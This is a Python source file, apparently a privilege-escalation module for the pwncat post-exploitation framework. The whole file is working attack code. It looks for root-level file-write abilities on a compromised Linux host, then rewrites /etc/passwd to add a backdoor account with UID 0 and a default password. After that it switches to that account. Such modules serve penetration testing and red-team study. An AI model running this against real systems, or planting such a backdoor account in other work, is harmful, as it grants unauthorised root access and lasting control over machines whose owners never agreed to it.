#!/usr/bin/env python3
import crypt

from pwncat.modules import ModuleFailed
from pwncat.modules.agnostic.enumerate import EnumerateModule, Schedule
from pwncat.modules.linux.enumerate.escalate import EscalationReplace
from pwncat.platform.linux import Linux
from pwncat.util import console


class AppendPasswd(EscalationReplace):
    """ Escalation through adding a new user to /etc/passwd """

    def __init__(self, source, ability):
        super().__init__(source=source, uid=ability.uid)

        self.ability = ability

    def escalate(self, session):

        try:
            with session.platform.open("/etc/passwd", "r") as filp:
                passwd_contents = list(filp)
        except (FileNotFoundError, PermissionError):
            raise ModuleFailed("failed to read /etc/passwd")

        backdoor_user = session.config.get("backdoor_user", "pwncat")
        backdoor_pass = session.config.get("backdoor_pass", "pwncat")
        shell = session.platform.getenv("SHELL")

        # Hash the backdoor password
        backdoor_hash = crypt.crypt(backdoor_pass, crypt.METHOD_SHA512)

        if not any(line.startswith(f"{backdoor_user}:") for line in passwd_contents):

            # Add our password
            passwd_contents.append(
                f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}"""
            )

            try:
                # Write the modified password entry back
                with self.ability.open(session, "/etc/passwd", "w") as filp:
                    filp.writelines(passwd_contents)
                    filp.write("\n")
            except (FileNotFoundError, PermissionError):
                raise ModuleFailed("failed to write /etc/passwd")

        else:
            console.log(
                f"[cyan]{backdoor_user}[/cyan] already exists; attempting authentication"
            )

        try:
            session.platform.su(backdoor_user, password=backdoor_pass)
        except PermissionError:
            raise ModuleFailed("added user, but switch user failed")

    def __str__(self):
        return f"""add user via [blue]file write[/blue] as [red]root[/red] (w/ {self.ability})"""


class Module(EnumerateModule):
    """ Check for possible methods of escalation via modiying /etc/passwd """

    PROVIDES = ["escalate.replace"]
    SCHEDULE = Schedule.PER_USER
    PLATFORM = [Linux]

    def enumerate(self, session):

        for ability in session.run("enumerate.gather", types=["ability.file.write"]):
            if ability.uid != 0:
                continue

            yield AppendPasswd(self.name, ability)
